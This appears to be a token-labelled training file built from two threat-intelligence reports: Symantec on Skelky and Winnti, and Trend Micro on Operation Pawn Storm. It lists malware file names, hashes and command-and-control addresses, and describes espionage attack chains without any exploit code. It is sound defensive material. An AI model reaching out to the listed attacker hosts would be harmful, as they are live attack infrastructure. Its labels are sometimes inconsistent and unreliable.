BackdoorWinnti_TrojanSkelky,HookDC64.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,f01026e1107b722435126c53b2af47a9,ioc
BackdoorWinnti_TrojanSkelky,"    
",O
BackdoorWinnti_TrojanSkelky,ole.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,f01026e1107b722435126c53b2af47a9,ioc
BackdoorWinnti_TrojanSkelky,"
",O
BackdoorWinnti_TrojanSkelky,HookDC.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,747cc5ce7f2d062ebec6219384b57e8c,ioc
BackdoorWinnti_TrojanSkelky,"        
",O
BackdoorWinnti_TrojanSkelky,ole.dll,ioc
BackdoorWinnti_TrojanSkelky,: ,O
BackdoorWinnti_TrojanSkelky,747cc5ce7f2d062ebec6219384b57e8c,ioc
BackdoorWinnti_TrojanSkelky,"    

The link between ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky,"
From the first observed use of the tool in ",O
BackdoorWinnti_TrojanSkelky,January 2013,timestamp
BackdoorWinnti_TrojanSkelky," to the present, the attackers have consistently
used the same password. This is the case with three different variants of the tool. The regular use of
the same password across multiple variants means itâ€™s likely that only one group of attackers has
been using the tool ",O
BackdoorWinnti_TrojanSkelky,until at least January 2015,timestamp
BackdoorWinnti_TrojanSkelky,". 

By identifying any other malware active on compromised computers at the same time as
",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,", it is possible to learn more about the attackers. There were almost no signs of other
malware active at the same time as ",O
BackdoorWinnti_TrojanSkelky,Skelky,malware
BackdoorWinnti_TrojanSkelky," in most of the organizations investigated. However, two
compromised computers had other malware present, active, and in the same directory, at the same
time as ",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,". 

Two files were discovered on one of the victimâ€™s computers. One file is a variant of
",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky, (,O
BackdoorWinnti_TrojanSkelky,jqs.exe,ioc
BackdoorWinnti_TrojanSkelky,) and the other is a dropper for ,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," (tmp8296.tmp), which is
responsible for creating the ",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," sample. Details on the file names and hashes are as
follows:

",O
BackdoorWinnti_TrojanSkelky,jqs.exe,ioc
BackdoorWinnti_TrojanSkelky, (,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky, dropper): ,O
BackdoorWinnti_TrojanSkelky,600b604784594e3339776c6563aa45a1,ioc
BackdoorWinnti_TrojanSkelky,"
",O
BackdoorWinnti_TrojanSkelky,tmp8296.tmp,ioc
BackdoorWinnti_TrojanSkelky, (,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky, variant): ,O
BackdoorWinnti_TrojanSkelky,48377c1c4cfedebe35733e9c3675f9be,ioc
BackdoorWinnti_TrojanSkelky,"

",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," has been used in the past in a number of different campaigns, most notably against
Asian games companies. Given the disparate nature of some victims, itâ€™s unclear if the malware
is used by one set of attackers, or many. ",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky," is continuing its investigation into this malware
family ",O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky, and the specific actors behind the combined use of ,O
BackdoorWinnti_TrojanSkelky,Backdoor.Winnti,malware
BackdoorWinnti_TrojanSkelky," and
",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,".

2 of 3



",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,Norton,org
BackdoorWinnti_TrojanSkelky," protection
",O
BackdoorWinnti_TrojanSkelky,Symantec,org
BackdoorWinnti_TrojanSkelky, and ,O
BackdoorWinnti_TrojanSkelky,Norton,org
BackdoorWinnti_TrojanSkelky," products have the following protections against the skeleton key malware:

AV

",O
BackdoorWinnti_TrojanSkelky,Trojan.Skelky,malware
BackdoorWinnti_TrojanSkelky,"

Customers with Behaviour-Based Protection enabled are protected with the signature
SONAR.Module!gen3.

3 of 3",O
wp-operation-pawn-storm,Operation,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,": Using Decoys to Evade Detection


A ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," Research Paper

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"
Using Decoys to Evade Detection

",O
wp-operation-pawn-storm,Loucif Kharouni,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Feike Hacquebord,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Numaan Huq,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Jim Gogolinski,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Fernando Mercês,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Alfred Remorin,identity
wp-operation-pawn-storm,"
",O
wp-operation-pawn-storm,Douglas Otis,identity
wp-operation-pawn-storm,"
Forward-Looking Threat Research Team



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," LEGAL DISCLAIMER

The information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. 
The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on 
or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend 
Micro reserves the right to modify the contents of this document at any time without prior notice.

Translations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise 
related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the 
translation are not binding and have no legal effect for compliance or enforcement purposes.

Although ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," uses reasonable efforts to include accurate and up-to-date information herein, ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," makes no warranties or representations of any kind 
as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend 
Micro disclaims all warranties of any kind, express or implied. Neither ",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," nor any party involved in creating, producing, or delivering this document shall 
be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising 
out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information 
constitutes acceptance for use in an “as is” condition.

CONTENTS

Introduction ....................................................................................................................................1

Ties That Bind the Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," Attacks Together .........................................................2

",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,"....................................................................................................................................2

Attack Timeline ........................................................................................................................2

Attack Details ...........................................................................................................................4

Attack Evolution .......................................................................................................................5

Next-Level Phishing Targets ..................................................................................................11

Case 1: ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Hungary,country
wp-operation-pawn-storm," .............................................................................11

Case 2: ",O
wp-operation-pawn-storm,OSCE,org
wp-operation-pawn-storm,", ",O
wp-operation-pawn-storm,Austria,country
wp-operation-pawn-storm," ....................................................................................................13

Case 3: SAIC, ",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm," ...........................................................................................13

Case 4: Academi ..............................................................................................................13

Other Webmail Services ........................................................................................................14

Conclusion ...................................................................................................................................16

References ..................................................................................................................................17



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

1

INTRODUCTION

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," refers to economic 
and political espionage attacks instigated by 
a group of threat actors primarily targeting 
",O
wp-operation-pawn-storm,military,industry
wp-operation-pawn-storm,",",O
wp-operation-pawn-storm,embassy,industry
wp-operation-pawn-storm,", and defense contractor 
personnel from the ",O
wp-operation-pawn-storm,United States,country
wp-operation-pawn-storm," and its 
allies. Opposing factions to and dissidents 
of the ",O
wp-operation-pawn-storm,Russian government,org
wp-operation-pawn-storm,", international 
media, and even the national security 
department of a ",O
wp-operation-pawn-storm,U.S.,country
wp-operation-pawn-storm," ally were also targeted. 
The threat actors used three attack vectors―
spear-phishing emails with malicious 
attachments, an advanced network of 
phishing websites, and exploits injected into 
legitimate conference and media websites. 
They used a nonmalicious ",O
wp-operation-pawn-storm,JavaScript,software
wp-operation-pawn-storm," to 
victimize ",O
wp-operation-pawn-storm,Microsoft™ Outlook® Web Access,software
wp-operation-pawn-storm," 
(",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm,") users from carefully selected target 
organizations. The ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm," phishing attacks 
proved extremely effective and could be 

particularly dangerous to any organization 
that allows employees to use ",O
wp-operation-pawn-storm,OWA,software
wp-operation-pawn-storm,".

An in-depth look at six multistage attacks 
revealed one thing in common―the use of 
",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,Sofacy,threat_actor
wp-operation-pawn-storm," malware [1], [2]. The use 
of such multistage downloaders provided 
attackers additional protection against 
detection. We believe the threat actors aimed 
to confuse their targets’ IT administrators 
by making it hard for them to string attack 
components together, thus evading detection.

This research paper details when certain 
attacks occurred, what tools were used in 
attempts to get in to target networks, and 
target profiles to form a general picture of 
Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,".



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

2

TIES THAT BIND THE OPERATION ",O
wp-operation-pawn-storm,"PAWN
STORM",campaign
wp-operation-pawn-storm," ATTACKS TOGETHER

",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,"

",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm," malware are mostly backdoors [3], [4] 
and information stealers [5] that log affected 
users’ keystrokes, steal system information, 
and send stolen information to remote 
command-and-control (C&C) servers.

Analyses of the ",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm," infectors that arrived 
as email attachments in the attacks featured 
in this paper revealed six distinct chains [see 
diagram on page 3].

Attack Timeline

The investigation focused on a group of 
attacks that has been dubbed “Operation 
",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"” [6] due to the attackers’ use of 
two or more connected tools/tactics to attack 
a specific target similar to the chess strategy 
it was named after. This paper illustrates how 
the ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," attacks were carried out with 
the aid of five spear-phishing emails, which 
used contextually relevant subjects to get 
specific targets from different countries to 
open weaponized attachments designed to 
compromise their systems.

 
Timeline of spear-phishing emails sent to specific targets

The attackers sent emails to potential victims, 
including military, embassy, and defense 
contractor personnel. The following emails 
were among those that were found related to 
this operation:

• An email sent to a potential victim 
from the ",O
wp-operation-pawn-storm,Ministry of Defense,org
wp-operation-pawn-storm, in ,O
wp-operation-pawn-storm,France,country
wp-operation-pawn-storm," 
had an exploit for ",O
wp-operation-pawn-storm,CVE-2010-3333,O
wp-operation-pawn-storm," 
[7] disguised as a document named 

“",O
wp-operation-pawn-storm,International Military.rtf,ioc
wp-operation-pawn-storm,.” ,O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm," 
received a sample of this on ",O
wp-operation-pawn-storm,"October 
17, 2011",timestamp
wp-operation-pawn-storm," and has been detecting it as 
",O
wp-operation-pawn-storm,TROJ_ARTIEF.AP,malware
wp-operation-pawn-storm," [8] since then.

• An email sent to a potential victim 
working from the ",O
wp-operation-pawn-storm,Vatican Embassy,org
wp-operation-pawn-storm," 
in ",O
wp-operation-pawn-storm,Iraq,country
wp-operation-pawn-storm," used reports of a bombing 
incident [9] that occurred on ",O
wp-operation-pawn-storm,"January 
9, 2012",timestamp
wp-operation-pawn-storm," as social engineering lure. 



3

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, |Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"


",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm," infectors attached to targeted attack campaign emails

Sent a day after the incident, 
the email had a ",O
wp-operation-pawn-storm,"Microsoft 
Word®",software
wp-operation-pawn-storm," file attachment named 
“",O
wp-operation-pawn-storm,"IDF_Spokesperson_Terror_
Attack_011012.doc",ioc
wp-operation-pawn-storm,",” which 
exploited ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm," [10].

 
Sample email sent to recipients from the 

",O
wp-operation-pawn-storm,Vatican Embassy,org
wp-operation-pawn-storm, in ,O
wp-operation-pawn-storm,Iraq,country
wp-operation-pawn-storm,"

 
Exploit for ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm," disguised as a 

Word (.DOC) file


",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

4

• An email sent on ",O
wp-operation-pawn-storm,"September 20, 
2013",timestamp
wp-operation-pawn-storm," to military officials from several 
countries used the then-upcoming 
“Asia-Pacific Economic Cooperation 
(APEC) ",O
wp-operation-pawn-storm,Indonesia,country
wp-operation-pawn-storm," 2013” conference 
as bait. The email had two ",O
wp-operation-pawn-storm,"Microsoft 
Excel®",software
wp-operation-pawn-storm," file attachments named 
“",O
wp-operation-pawn-storm,APEC Media list 2013 Part1.xls,ioc
wp-operation-pawn-storm,",” 
which exploited ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm,", and 
“",O
wp-operation-pawn-storm,APEC Media list 2013 Part2.xls,ioc
wp-operation-pawn-storm,",” 
which was nonmalicious.

 
Sample email sent to military officials across 
countries using the “APEC ",O
wp-operation-pawn-storm,Indonesia,country
wp-operation-pawn-storm," 2013” 

conference as bait

 
Exploit for ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm, disguised as an ,O
wp-operation-pawn-storm,Excel,software
wp-operation-pawn-storm," 

(.XLS) file (",O
wp-operation-pawn-storm,APEC Media list 2013 Part1.xls,ioc
wp-operation-pawn-storm,")

• An email sent to Pakistani military 
officials on ",O
wp-operation-pawn-storm,"January 23, 2014",timestamp
wp-operation-pawn-storm," used the 
“Homeland Security Summit Middle 
East” [11] conference as bait. It had a 
Word file attachment named “",O
wp-operation-pawn-storm,"Details.
doc",ioc
wp-operation-pawn-storm,",” which exploited ",O
wp-operation-pawn-storm,"CVE-2012-
0158",O
wp-operation-pawn-storm,".

 
Sample email sent to military officials from 

Pakistan using the “Homeland Security Summit 
Middle East” conference as bait

• An email sent to ",O
wp-operation-pawn-storm,Polish government,org
wp-operation-pawn-storm," 
employees [12] on ",O
wp-operation-pawn-storm,"August 11, 2014",timestamp
wp-operation-pawn-storm," 
had a MIME HTML (.MHT) file 
attachment named “",O
wp-operation-pawn-storm,MH17.doc,ioc
wp-operation-pawn-storm,",” which 
exploited ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm,".

 
Exploit for ",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm," disguised as a MIME 

HTML (.MHT) file

Attack Details

All of the observed Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," 
attacks comprised several stages. Each 
attack had at least two phases:

• In phase 1, opening the email 
attachment displays a decoy 
document while the exploit runs in 
the background. The exploit drops 
a downloader component (.DLL file) 
named “",O
wp-operation-pawn-storm,netids.dll,ioc
wp-operation-pawn-storm,",” “",O
wp-operation-pawn-storm,netidt.dll,ioc
wp-operation-pawn-storm,",” or 
“",O
wp-operation-pawn-storm,coreshell.dll,ioc
wp-operation-pawn-storm,".”



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

5

• In phase 2, the downloader 
component communicates with a C&C 
server and downloads a dropper that 
ultimately installs a keylogger. After 

capturing information from infected 
systems, the keylogger sends data 
back to the C&C server.

 
Phases 1 and 2 in an Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," attack

We only managed to collect latter-
stage payloads for two out of the six 
aforementioned attacks. The C&C servers 
tied to the other four attacks refused to serve 
the rest of the files to complete the attack 
chains.

Multistage attacks are a double-edged sword. 
If one link in the attack chain, aside from 
the end node, is detected and removed in 
the initial infection stage, the entire attack 
fails. On the other hand, having several 
links in the attack chain makes detecting the 
final component more difficult. Tracing the 
previous and next links is also difficult when 
any of the components is inspected on its 
own outside the attack chain.

Although some of the C&C servers were still 
alive at the time of investigation, they did not 
respond to our infected systems. Repeated 
attempts to trick the C&C servers into serving 
the next files in the incomplete attack chains 
failed. The attacks they were tied to could be 
time sensitive and it is possible that they no 
longer hosted the files for succeeding stages.

Attack Evolution

Even though the filenames used for different 
components remained fairly consistent from 
2010 to the present, earlier attacks were 
more elaborate and complex compared with 
those seen this year. The 2014 attacks we 
have seen were more streamlined.



",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

6

 
Comparison of an Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," attack in 2011 and another in 2014

Although variations in past and current 
attack chains exist, both are still being 
used by threat actors to date to ensure one 

thing—detection evasion. The following table 
compares and contrasts the six Operation 
",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," attacks in greater detail.



7

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

Unknown exploit, 
possibly disguised 
as a .PDF, .DOC, 
or .RTF file, carries 
the top-level dropper 
(",O
wp-operation-pawn-storm,dropper.exe,ioc
wp-operation-pawn-storm,"; SHA-
1: ",O
wp-operation-pawn-storm,"72cfd996957bde0 
6a02b0adb2d66d8a 
a9c25bf37",ioc
wp-operation-pawn-storm,")

.RTF file exploits 
",O
wp-operation-pawn-storm,CVE-2010-3333,O
wp-operation-pawn-storm," 
(SHA-1: ",O
wp-operation-pawn-storm,"956d1a360 
55c903cb570890da 
69deabaacb5a18a",ioc
wp-operation-pawn-storm,") 
and drops ",O
wp-operation-pawn-storm,saver.scr,ioc
wp-operation-pawn-storm," 
(SHA-1: ",O
wp-operation-pawn-storm,e8b55d9aeff124df4008b0d372bf2f2d3e5e5ae7,ioc
wp-operation-pawn-storm,")

Unknown 
exploit carries a 
dropper (",O
wp-operation-pawn-storm,"Dropper 
DLL",ioc
wp-operation-pawn-storm,"; SHA-1: 
",O
wp-operation-pawn-storm,9c622b39521183dd71ed2a174031ca159beb6479,ioc
wp-operation-pawn-storm,")

Two .XLS files come 
with spear-phishing 
emails:

• First file (",O
wp-operation-pawn-storm,APEC Media list 2013 Part1.xls,ioc
wp-operation-pawn-storm,"; SHA-
1: ",O
wp-operation-pawn-storm,a90921c182cb90807102ef402719ee8060910345,ioc
wp-operation-pawn-storm,") exploits 
",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm,"

• Second file 
(",O
wp-operation-pawn-storm,APEC Media list 2013 Part2.xls,ioc
wp-operation-pawn-storm,; SHA-1: ,O
wp-operation-pawn-storm,b3098f99db1f80e27aec0c9a5a625aedaab5899a,ioc
wp-operation-pawn-storm,") 
is a decoy document

.RTF file (SHA-1: 
",O
wp-operation-pawn-storm,78d28072fdabf0b5aac5e8f337dc768d07b63e1e,ioc
wp-operation-pawn-storm,") exploits 
",O
wp-operation-pawn-storm,CVE-2012-0158,O
wp-operation-pawn-storm," 
and drops ",O
wp-operation-pawn-storm,saver.scr,ioc
wp-operation-pawn-storm," 
(SHA-1: ",O
wp-operation-pawn-storm,7FBB5A2E46FACD3EE0C945F324414210C2199FFB,ioc
wp-operation-pawn-storm,) into ,O
wp-operation-pawn-storm,"\Temp\

.MHT file drops:
• ",O
wp-operation-pawn-storm,MH17.doc,ioc
wp-operation-pawn-storm," 

(SHA-1: ",O
wp-operation-pawn-storm,DAE7FAA1725DB8192AD711D759B13F8195A18821,ioc
wp-operation-pawn-storm,"), 
a decoy 
document, 
into ",O
wp-operation-pawn-storm,"\Temp\

• W.q (SHA-1: ",O
wp-operation-pawn-storm,"8D 
EF0A554F1913 
4A5DB3D2AE9 
49F9500CE3D 
D2CE",ioc
wp-operation-pawn-storm,"), a 
dropper, 
into ",O
wp-operation-pawn-storm,"\Temp\



8

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

Dropper.exe drops:
• Decoy file 

(",O
wp-operation-pawn-storm,"Letter to IAEA.
pdf",ioc
wp-operation-pawn-storm,; SHA-1: ,O
wp-operation-pawn-storm,"6ad 
a11c71a5176a8 
2a8898680ed1e 
aa4e79b9bc3",ioc
wp-operation-pawn-storm,") 
into ",O
wp-operation-pawn-storm,"\Temp\

• Downloader 
(",O
wp-operation-pawn-storm,netids.dll,ioc
wp-operation-pawn-storm,"; SHA-
1: ",O
wp-operation-pawn-storm,"c5ce5b7d10a 
ccb04a4e45c3a 
4dcf10d16b192 
e2f",ioc
wp-operation-pawn-storm,) into ,O
wp-operation-pawn-storm,"\
Application 
Data\

Saver.scr drops:
• Decoy 

document 
(",O
wp-operation-pawn-storm,"Military 
Cooperation.
doc",ioc
wp-operation-pawn-storm,; SHA-1: ,O
wp-operation-pawn-storm,"0E 
12C8AB9B89B6 
EB6BAF16C4B 
3BBF9530067 
963F",ioc
wp-operation-pawn-storm,") into 
",O
wp-operation-pawn-storm,"\Temp\

• Skype.exe 
(SHA-1: ",O
wp-operation-pawn-storm,"550AB 
D71650BAEA05 
A0071C4E084A 
803CB413C31",ioc
wp-operation-pawn-storm,"), 
a ",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm,"
variant, 
into ",O
wp-operation-pawn-storm,"\Temp\

• ",O
wp-operation-pawn-storm,"Cryptmodule.
exe",ioc
wp-operation-pawn-storm, (SHA-1: ,O
wp-operation-pawn-storm,"4B 
8806FE8E0CB4 
9E4AA5D8F877 
66415A2DB1E9 
A9",ioc
wp-operation-pawn-storm,") into 
",O
wp-operation-pawn-storm,"\
Microsoft\Crypt\

Dropper DLL drops 
",O
wp-operation-pawn-storm,netids.dll,ioc
wp-operation-pawn-storm, (SHA-1: ,O
wp-operation-pawn-storm,"dd 
61530076152dae56 
8b4834b1899212c9 
6c1a02",ioc
wp-operation-pawn-storm,") into 
",O
wp-operation-pawn-storm,"\
Application Data\

",O
wp-operation-pawn-storm,"APEC Media list 
2013 Part1.xls",ioc
wp-operation-pawn-storm," drops 
dw20.t (SHA-1: ",O
wp-operation-pawn-storm,"ac6b 
465a13370f87cf579 
29b7cfd1e45c36945 
85",ioc
wp-operation-pawn-storm,"), a .DLL file

Saver.scr drops:
• IDF_

",O
wp-operation-pawn-storm,"Spokesperson_
Targeted_
Attack_101012.
doc",ioc
wp-operation-pawn-storm, (SHA-1: ,O
wp-operation-pawn-storm,"F5 
42C5F9259274 
D94360013D14 
FFBECC43AAE 
552",ioc
wp-operation-pawn-storm,"), a decoy 
document, 
into ",O
wp-operation-pawn-storm,"\Temp\

• ",O
wp-operation-pawn-storm,Install.exe,ioc
wp-operation-pawn-storm," 
(SHA-1: ",O
wp-operation-pawn-storm,"BC58A 
8550C53689C8 
148B021C917F 
B4AEEC62AC",ioc
wp-operation-pawn-storm," 
1) into ",O
wp-operation-pawn-storm,"\Temp\

W.q drops:
• ",O
wp-operation-pawn-storm,Coreshell.dll,ioc
wp-operation-pawn-storm," 

(SHA-1: ",O
wp-operation-pawn-storm,"A85513 
97E1F1A2C014 
8E6EADCB56F 
A35EE6009CA",ioc
wp-operation-pawn-storm,") 
into ",O
wp-operation-pawn-storm,"\Common 
Files\System\

• ",O
wp-operation-pawn-storm,Tmp64.dat,ioc
wp-operation-pawn-storm,", 
a copy of 
coreshell.dll, 
into ",O
wp-operation-pawn-storm,"\Common 
Files\System\



9

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

",O
wp-operation-pawn-storm,Netids.dll,ioc
wp-operation-pawn-storm," 
communicates 
with a C&C server 
(",O
wp-operation-pawn-storm,200.106.145.122,ioc
wp-operation-pawn-storm,")

• Military 
Cooperation.
doc has been 
encoded 
using Cyrillic 
characters and 
opens in Word

• Skype.exe 
drops:
• Downloader 

(netids.dll; 
SHA-1: ",O
wp-operation-pawn-storm,"6b87 
5661a74c46 
73ae6ee89a 
cc5cb6927ca 
5fd0d",ioc
wp-operation-pawn-storm,"), a 
",O
wp-operation-pawn-storm,SEDNIT,threat_actor
wp-operation-pawn-storm," 
variant, into 
",O
wp-operation-pawn-storm,"\
system32\

• Copy of 
netids.dll 
(mscsv.
tmp) into 
",O
wp-operation-pawn-storm,"\
system32\

• ",O
wp-operation-pawn-storm,"Cryptmodule.
exe",ioc
wp-operation-pawn-storm," drops s.vbs 
(actually a 
.PE and not a 
.VBS file) and 
communicates 
with a C&C 
server (windous.
kz)

Netids.dll downloads 
and saves msmvs.
exe (SHA-1: ",O
wp-operation-pawn-storm,"88f7e27 
1e54c127912db4db 
49e37d93aea8a49c 
9",ioc
wp-operation-pawn-storm,) in ,O
wp-operation-pawn-storm,"\Temp\

",O
wp-operation-pawn-storm,Dw20.t,ioc
wp-operation-pawn-storm," drops netids.
dll (SHA-1: ",O
wp-operation-pawn-storm,"3814eec 
8c45fc4313a9c7f65c 
e882a7899cf0405",ioc
wp-operation-pawn-storm,")

Install.exe drops 
netids.dll (SHA-1: ",O
wp-operation-pawn-storm,"14 
BEEB0FC5C8C887 
D0435009730B6370 
BF94BC93",ioc
wp-operation-pawn-storm,") into 
",O
wp-operation-pawn-storm,"\
system32\

",O
wp-operation-pawn-storm,Coreshell.dll,ioc
wp-operation-pawn-storm," 
downloads conhost.
dll (SHA-1: ",O
wp-operation-pawn-storm,"B49FAD 
3E5E6787E96373A 
C37ED58083F7572 
D72A",ioc
wp-operation-pawn-storm,"), a dropper, 
from a C&C server



10

",O
wp-operation-pawn-storm,Trend Micro,org
wp-operation-pawn-storm, | Operation ,O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm,"

Operation ",O
wp-operation-pawn-storm,Pawn Storm,campaign
wp-operation-pawn-storm," Attack Comparison

Case 1 Case 2 Case 3 [13] Case 4 Case 5 Case 6

C&C server 
confirms receipt of 
communication from 
infected systems 
then stops further 
interactions

• ",O
wp-operation-pawn-storm,Netids.dll,ioc
wp-operation-pawn-storm," 
communicates 
with a C&C 
server 
(",O
wp-operation-pawn-storm,70.85.221.20,ioc
wp-operation-pawn-storm,")

• ",O
wp-operation-pawn-storm,S.vbs,ioc
wp-operation-pawn-storm, (SHA-1: ,O
wp-operation-pawn-storm,"0 
A3E6607D5E9 
C59C712106C3 
55962B11DA29 
02FC",ioc
wp-operation-pawn-storm,") runs 
CreateFile C:\\
DOCUME~1\\
ADMINI~1\\
LOCALS~1\\
Temp\\update.
exe but does 
nothing else

",O
wp-operation-pawn-storm,Msmvs.exe,ioc
wp-operation-pawn-storm," drops 
conhost.dll (SHA-1: 
",O
wp-operation-pawn-storm,"55318328511961EC 
339DFDDCA044306 
8DCCE9CD2",ioc
wp-operation-pawn-storm,") into 
",O
wp-operation-pawn-storm,"\
Temp\

",O
wp-operation-pawn-storm,Netids.dll,ioc
wp-operation-pawn-storm," 
communicates 
with a C&C server 
(",O
wp-operation-pawn-storm,"70.85.221.10,",ioc
wp-operation-pawn-storm,")

",O
wp-operation-pawn-storm,Netids.dll,ioc
wp-operation-pawn-storm," 
communicates 
with a C&C server 
(",O
wp-operation-pawn-storm,70.85.221.10,ioc
wp-operation-pawn-storm,")

",O
wp-operation-pawn-storm,Conhost.dll,ioc
